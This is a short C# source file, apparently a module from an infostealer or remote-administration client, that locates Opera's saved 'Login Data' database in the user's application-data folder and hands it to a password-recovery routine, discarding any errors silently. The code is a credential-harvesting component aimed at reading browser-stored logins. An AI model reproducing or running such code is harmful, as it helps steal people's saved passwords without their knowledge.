using Client.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Client.Controllers
{
    class Opera
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Login Data");
                return PasswordRecoveryController.Passwords(datapath, "Opera");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
